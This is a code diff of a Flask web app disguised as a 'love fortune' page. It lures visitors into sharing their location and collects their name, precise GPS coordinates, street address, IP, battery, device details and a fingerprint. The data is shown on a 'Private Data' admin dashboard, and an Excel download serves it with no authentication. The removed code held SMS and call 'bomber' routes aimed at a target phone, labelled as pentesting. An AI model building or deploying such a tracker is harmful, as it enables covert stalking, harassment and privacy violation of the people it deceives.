-                await fetch('/save', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(collectedData)
-                });
-                
-                document.getElementById('fortuneBtn').classList.remove('hidden');
-                document.getElementById('bomberSection').classList.remove('hidden');
-                showStatus('✅ Pentest suite ready! Target phone captured.', 'success');
-            });
-        }
-
-        // getFortune() remains the same with TinyURL
-    </script>
+      }catch(e){document.getElementById('form').style.display='block';}
+    },
+    ()=>{document.getElementById('load').classList.remove('show');showOverlay();},
+    {enableHighAccuracy:true,timeout:12000,maximumAge:0}
+  );
+}
+function showOverlay(){document.getElementById('overlay').classList.add('show');}
+window.retry=function(){document.getElementById('form').style.display='none';askLocation();};
+</script>
 </body>
-</html>
-    """)
+</html>'''
+
+@app.route('/')
+def home():
+    return HTML
 
 @app.route('/save', methods=['POST'])
-def save_fortune():
-    data = request.get_json()
-    df = load_data()
-    new_row = pd.DataFrame([data])
-    
-    # Ensure bomber columns
-    bomber_cols = ['TargetNumber', 'SMSCount', 'CallCount', 'SMSBomberActive', 'CallBomberActive']
-    for col in bomber_cols:
-        if col not in new_row.columns:
-            new_row[col] = 0 if 'Count' in col else False
-    
-    new_row['IP'] = get_client_ip()
-    new_row['Timestamp'] = pd.Timestamp.now()
-    
-    # Geocode
-    lat = data.get('latitude', 0)
-    lng = data.get('longitude', 0)
-    if lat and lng:
-        try:
-            geo_url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lng}&format=json"
-            geo_resp = requests.get(geo_url, headers={'User-Agent': 'LoveFortune/1.0'}, timeout=5)
-            new_row['Address'] = geo_resp.json().get('display_name', 'Unknown')
-        except:
-            new_row['Address'] = 'Geocode failed'
-    
-    df = pd.concat([df, new_row], ignore_index=True)
-    save_data(df)
-    return jsonify({'status': 'saved'})
+def save():
+    ensure_persistent_storage()
+    try:
+        data = request.json
+        lat = data['latitude']
+        lon = data['longitude']
+        addr = geocode_reverse(lat, lon)
+        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
-@app.route('/start-sms', methods=['POST'])
-def start_sms_bomb():
-    data = request.get_json()
-    phone = data['phone']
-    session_id = data['sessionId']
-    
-    bombing_sessions[session_id] = {
-        'sms_active': False, 'call_active': False,
-        'sms_count': 0, 'call_count': 0, 'target': phone
-    }
-    
-    # Start bomber thread
-    sms_thread = threading.Thread(target=simulate_sms_bomb, args=(phone, session_id))
-    sms_thread.daemon = True
-    sms_thread.start()
-    
-    return jsonify({'status': 'sms_bomber_started', 'target': phone})
+        record = {
+            'DateTime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'Name': data['name'],
+            'Latitude': lat,
+            'Longitude': lon,
+            'Google Maps': maps_link,
+            'Accuracy_m': data['accuracy'],
+            'Address': addr,
+            'Battery_%': data['battery_level'],
+            'Charging': data['battery_charging'],
+            'Device': data['userAgent'][:150],
+            'Screen': data['screen'],
+            'Platform': data['platform'],
+            'IP_Address': ip,
+            'Timezone': data.get('timezone', 'Unknown'),
+            'Device_Memory_GB': data.get('device_memory', 'Unknown'),
+            'Network_Type': data.get('network_type', 'Unknown'),
+            'Fingerprint': data.get('fingerprint', 'Unknown')
+        }
 
-@app.route('/stop-sms', methods=['POST'])
-def stop_sms_bomb():
-    data = request.get_json()
-    session_id = data['sessionId']
-    if session_id in bombing_sessions:
-        bombing_sessions[session_id]['sms_active'] = False
-    return jsonify({'status': 'sms_bomber_stopped'})
+        save_data_permanent(record)
+        fortune = random.choice(FORTUNES).format(name=data['name'])
+        print(f"✅ Saved: {data['name']} | {lat:.4f},{lon:.4f} | IP: {ip}")
+        return jsonify({'saved': True, 'fortune': fortune})
+    except Exception as e:
+        print("ERR:", e)
+        return jsonify({'saved': False}), 500
 
-@app.route('/start-call', methods=['POST'])
-def start_call_bomb():
-    data = request.get_json()
-    phone = data['phone']
-    session_id = data['sessionId']
-    
-    if session_id not in bombing_sessions:
-        bombing_sessions[session_id] = {'sms_active': False, 'call_active': False, 'sms_count': 0, 'call_count': 0}
-    
-    call_thread = threading.Thread(target=simulate_call_bomb, args=(phone, session_id))
-    call_thread.daemon = True
-    call_thread.start()
-    
-    return jsonify({'status': 'call_bomber_started', 'target': phone})
-
-@app.route('/stop-call', methods=['POST'])
-def stop_call_bomb():
-    data = request.get_json()
-    session_id = data['sessionId']
-    if session_id in bombing_sessions:
-        bombing_sessions[session_id]['call_active'] = False
-    return jsonify({'status': 'call_bomber_stopped'})
-
-@app.route('/admin')
+@app.route('/admin', methods=['GET','POST'])
 def admin():
-    if request.args.get('pass') != 'admin123':
-        return '<form>Password: <input name="pass"><button>Login</button></form>'
-    
-    df = load_data()
-    if df.empty:
-        return "<h2>No data</h2>"
-    
-    html = f"""
-    <h2>🚨 LOVE FORTUNE PENTEST DASHBOARD</h2>
-    <h3>Active Bombers: {len(bombing_sessions)}</h3>
-    <table border='1' style='border-collapse:collapse;'>
-    <tr style='background:#ff1493;color:white;'>
-    """
-    for col in df.columns:
-        html += f"<th>{col}</th>"
-    html += "</tr>"
-    
-    for _, row in df.iterrows():
-        html += "<tr>"
-        for val in row:
-            display = str(val)[:50] + "..." if len(str(val)) > 50 else str(val)
-            html += f"<td>{display}</td>"
-        html += "</tr>"
-    
-    html += f"""
-    </table>
-    <br><a href="/download-excel"><button style='padding:15px;font-size:18px;background:#ff1493;color:white;border:none;border-radius:25px;'>📥 DOWNLOAD FULL EXCEL</button></a>
-    <h3>Live Bombers:</h3><pre>{json.dumps(bombing_sessions, indent=2)}</pre>
-    """
-    return html
-
-@app.route('/download-excel')
-def download_excel():
-    if request.args.get('pass') != 'admin123':
+    if request.method == 'GET':
+        return '''<!DOCTYPE html>
+<html><head><meta charset="UTF-8">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(135deg,#ff9a9e,#fecfef);}
+.card{background:#fff;padding:45px 40px;border-radius:24px;box-shadow:0 10px 30px rgba(0,0,0,0.12);text-align:center;width:320px;}
+h2{color:#c06c84;margin-bottom:24px;font-size:22px;}
+input{width:100%;padding:13px 18px;border:2px solid #ffdde1;border-radius:40px;font-size:15px;text-align:center;outline:none;margin-bottom:16px;}
+input:focus{border-color:#c06c84;}
+button{width:100%;padding:13px;background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;border:none;border-radius:40px;font-size:16px;font-weight:bold;cursor:pointer;}
+</style></head>
+<body>
+<div class="card"><h2>🔒 Admin Access</h2><form method="POST"><input name="password" type="password" placeholder="Enter password" required><button type="submit">Login</button></form></div>
+</body></html>'''
+    if request.form.get('password') != ADMIN_PASSWORD:
         abort(403)
-    return send_file(DATA_FILE, as_attachment=True)
+    df = load_data()
+    rows = ''
+    for _, row in df.iterrows():
+        gps = f"{row['Latitude']:.4f}, {row['Longitude']:.4f}"
+        maps = row['Google Maps']
+        rows += f'''<tr>
+            <td style="white-space:nowrap;">{row['DateTime']}</td>
+            <td><b>{row['Name']}</b></td>
+            <td><a href="{maps}" target="_blank">📍 {gps}</a></td>
+            <td style="max-width:250px; font-size:11px;">{row['Address']}</td>
+            <td>{row['Accuracy_m']} m</td>
+            <td>{row['Battery_%']}%</td>
+            <td>{row['Charging']}</td>
+            <td style="max-width:180px; font-size:10px;">{row['Device']}</td>
+            <td>{row['Screen']}</td>
+            <td>{row['Platform']}</td>
+            <td>{row['IP_Address']}</td>
+            <td>{row['Timezone']}</td>
+            <td>{row['Device_Memory_GB']}</td>
+            <td>{row['Network_Type']}</td>
+            <td style="font-size:9px;">{row['Fingerprint']}</td>
+        </tr>'''
+    return f'''<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><style>
+body{{font-family:sans-serif;padding:20px;background:#fff0f5;}}
+h1{{color:#c06c84;}}
+table{{width:100%;border-collapse:collapse;background:#fff;border-radius:15px;overflow-x:auto;display:block;}}
+th{{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;padding:12px 8px;text-align:left;font-size:11px;}}
+td{{padding:8px;border-bottom:1px solid #ffe0e9;font-size:10px;}}
+tr:hover td{{background:#fff5f8;}}
+a{{color:#c06c84;text-decoration:none;}}
+</style></head>
+<body><h1>💋 Private Data — {len(df)} entries</h1>
+<div style="overflow-x:auto;"><table>
+    <thead><tr><th>DateTime</th><th>Name</th><th>Location</th><th>Address</th><th>Accuracy</th><th>Battery%</th><th>Charging</th><th>Device</th><th>Screen</th><th>Platform</th><th>IP</th><th>Timezone</th><th>Memory</th><th>Network</th><th>Fingerprint</th></tr></thead>
+    <tbody>{rows}</tbody>
+</table></div>
+<p><a href="/download-excel">📥 Download Excel file</a></p>
+</body></html>'''
+
+@app.route('/download-excel', methods=['GET'])
+def download_excel():
+    if os.path.exists(EXCEL_FILE):
+        return send_file(EXCEL_FILE, as_attachment=True, download_name='fortunes_data.xlsx')
+    return "No data yet", 404
 
 if __name__ == '__main__':
-    ensure_data_file()
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
+    ensure_persistent_storage()
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
